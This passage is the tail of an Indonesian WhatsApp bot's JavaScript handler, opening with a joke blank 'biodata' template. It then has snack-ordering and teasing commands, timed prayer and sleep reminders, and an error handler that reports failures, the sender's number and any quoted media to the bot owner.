NAMA BIBI:
NAMA PAMAN:
TWITTER:
FACEBOOK:
LIKE:
TIKTOK:
INSTAGRAM:
SESTYC:
PICSART:
SNAPCHAT:
TINDER:
AKTE KELAHIRAN:
KK:
KTP:
SIM:
STNK:
BPJS:
IJAZAH:
SERTIFIKAT TANAH:
SERTIFIKAT RUMAH:
FOTOCOPY IDENTITAS DIRI:
SURAT KETERANGAN KESEHATAN DARI DOKTER:
NILAI PALING TERTINGGI:
MAPEL KESUKAAN:
JALAN BERAPA LANGKAH:
LAGI APA:
UDAH MAKAN:
NILAI TERENDAH:
MAPEL PALING DIBENCI:
KULIAH :
SMA :
SMP:
SD :
TK/PAUD :
AGAMA:
FILM:
SINETRON:
ANIME:
K-DRAMA:
BIAS:
WAIFU:
HUSBU:
HUSBANDO:
LAIFU:
LAGU FAV:
MAKANAN FAV:
MINUMAN FAV:
UKURAN BAJU:
UKURAN CELANA:
UKURAN SEPATU:
UKURAN KAOS KAKI:
PANJANG TANGAN:
PANJANG KAKI:
PANJANG JARI KAKI:
PANJANG JARI TANGAN:
KARTU PELAJAR:
PASSPORT:
NAMA FREEFIRE:
NAMA PUBG:
NAMA HOTEL HIDEAWAY:
NAMA COD:
NAMA COC:
NAMA ML:
NAMA MANTAN:
JUMLAH MANTAN:
TINGGI:
BERAT BADAN:
SUKA SAMA SIAPA:
NAMA PACAR:
CALON ISTRI/SUAMI:
NAMA MERTUA:
BPKB:
KIS:
KIA:
SUHU BADAN:
PANJANG LIDAH:
OVO:
KARTU KREDIT:
KARTU MEMBER:
BCA:
BRI:
TELKOMSEL:
TRI:
KARTU MEMORI:
SMARTFREN:
PENYAKIT:
OBAT:
SIFAT:
ZODIAK:
TANGGAL LAHIR:
KITAB:
TEMPAT IBADAH:
TEMPAT WISATA:
NAMA TEMAN:
JUMLAH MURID DIKELAS:
JUMLAH ANGGOTA KELUARGA:
JUMLAH NYAMUK DIRUMAH:
JUMLAH KECOA DIRUMAH:
JUMLAH KUPU KUPU:
HEWAN KESUKAAN:
NAMA HEWAN PELIHARAAN:
ALAMAT RUMAH:
RT:
RW:
KELURAHAN:
KECAMATAN:
NAMA KOTA:
NAMA NEGARA:
KABUPATEN:
PLANET:
GALAKSI:
LANGIT:
DARATAN:
KEPULAUAN:
SAMUDRA:
LEBAR PINGGANG:
GAME FAVORIT:
CHANNEL YOUTUBE:
SIFAT:
MERK HP:
MERK MOBIL:
MERK LAPTOP:
MERK MOTOR:
JUMLAH MOBIL:
JUMLAH MOTOR:
TINGKAT RUMAH:
ALAMAT SEKOLAH:
NAMA JALAN MENUJU RUMAH:
NAMA JALAN MENUJU SEKOLAH:
ASAL:
NAMA BESTIE:
NAMA BESTFRIEND:
NAMA MUSUH:Lu
GULING ATAU BANTAL:
JUMLAH BAJU:
JUMLAH CELANA:
CITA CITA:
IMPIAN:
`)
}
//================================================================================\\
if (body.startsWith(`nitipGoreng`)) {
setReply(`Mau nitip gorengan apa kak?`)
Araa.sendButMessage(from, `Silahkan Pilih Salah Satu Kak`, `${fake}`, [
{ buttonId: `FFFFFF`, buttonText: { displayText: `Tempe Goreng` }, type: 1 },
{ buttonId: `FFFFFF`, buttonText: { displayText: `Tahu Goreng` }, type: 1 },
{ buttonId: `FFFFFF`, buttonText: { displayText: `Kentang Goreng` }, type: 1 },
])
}
//================================================================================\\
if (body.startsWith(`byeBeban`)) {
Araa.sendMessage(from, { text: `Lu suka y sma beban group yang baru keluar 🗿🚬` }, { quoted: m })
}
if (timeWib == '04:00:00') {
console.log(color(`[ BOT ]`), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'deeppink'))
setReply(`Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak`)
}
if (timeWib == '05:00:00') {
console.log(color(`[ BOT ]`), color('Udah sholat Subuh belum kak', 'deeppink'))
setReply(`Udah sholat Subuh belum kak`)
}
if (timeWib == '06:00:00') {
console.log(color(`[ BOT ]`), color('Pagi kak, Jangan lupa mandi', 'deeppink'))
setReply(`Pagi kak, Jangan lupa mandi`)
}
if (timeWib == '11:00:00') {
console.log(color(`[ BOT ]`), color('Siang kak, Dah mandi blm kak?', 'deeppink'))
setReply(`Siang kak, Dah mandi blm kak?`)
}
if (timeWib == '12:00:00') {
console.log(color(`[ BOT ]`), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'deeppink'))
setReply(`Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak`)
}
if (timeWib == '15:00:00') {
console.log(color(`[ BOT ]`), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'deeppink'))
setReply(`Dah jam 3 kak, Jangan lupa sholat Ashar ya kak`)
}
if (timeWib == '18:00:00') {
console.log(color(`[ BOT ]`), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'deeppink'))
setReply(`Udah mahgrip nih kak, jangan lupa sholat ya`)
}
if (timeWib == '19:00:00') {
console.log(color(`[ BOT ]`), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'deeppink'))
setReply(`Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi`)
}
if (timeWib == '20:00:00') {
console.log(color(`[ BOT ]`), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'deeppink'))
setReply(`Selamat malam kak, Jangan begadang ya kak, Tar sakit loh`)
}
if (timeWib == '00:00:00') {
console.log(color(`[ BOT ]`), color('ngantuk kak, tidur dulu ya kak', 'deeppink'))
setReply(`ngantuk kak, tidur dulu ya kak`)
}
//================================================================================\\
} catch (err) {
if (isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n${fake}`)
if (checkError(err.message, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
addError(err.message, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
if (autoblockcmd) {
addblockcmd(command, listcmdblock)
await setReply('Command telah di block karena terjadi error')
}
if (autoReport) {
if (isQuotedImage) {
var media = 'Reply Image ✅'
} else if (isQuotedVideo) {
var media = 'Reply Video ✅'
} else if (isQuotedSticker) {
var media = 'Reply Sticker ✅'
} else if (isQuotedAudio) {
var media = 'Reply Audio ✅'
} else if (isQuotedTeks) {
var media = 'Reply Teks ✅'
} else if (isQuotedTag) {
var media = 'Reply Tag ✅'
} else {
var media = 'No Quoted ❌'
}
if (q.length > '0') {
var tetek = q
} else if (q.length == '0') {
var tetek = 'No Query ❌'
}
if (isGroup && isBotGroupAdmins) {
let linkgc = await Araa.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if (isGroup && !isBotGroupAdmins) {
var yeh = `Botz Is Not Admin`
} else if (!isGroup) {
var yeh = `Botz Is Not In The Group`
}

let teks = `\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${
isGroup ? `${groupName}` : 'Di private chat'
}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [
{ buttonId: `${prefix}banuser ${sender}`, buttonText: { displayText: `ʙᴀɴɴᴇᴅ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}thanksuser ${sender}`, buttonText: { displayText: `ᴛʜᴀɴᴋs` }, type: 'RESPONSE' },
]
let tolol = {
text: teks,
footer: `${fake}\n${calender}`,
buttons: mok,
headerType: 1,
}
await Araa.sendMessage(Ownerin, tolol, { quoted: fkontak })

if (!autoblockcmd) {
await Araa.sendMessage(from, { text: 'Laporan error telah dikirim ke Developer Botz' })
}

if (isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio) {
let media = await Araa.downloadAndSaveMediaMessage(quoted)
await Araa.sendMedia(Ownerin, media, m, { caption: 'System Error' })
await fs.unlinkSync(media)
}
}
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
if (e.includes('this.isZero')) {
return
}
if (e.includes('rate-overlimit')) {
if (!publik) return
publik = false
await Araa.sendMessage(nomerOwner + '@s.whatsapp.net', {
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`,
})
await setTimeout(() => {
publik = true
Araa.sendMessage(nomerOwner + '@s.whatsapp.net', {
text: `Berhasil mengubah mode self ke mode public`,
})
}, 60000)
return
}
if (e.includes('Connection Closed')) {
return
}
if (e.includes('Timed Out')) {
return
}
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if (Console) {
Araa.sendMessage(Ownerin, { text: util.format(e) })
}
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
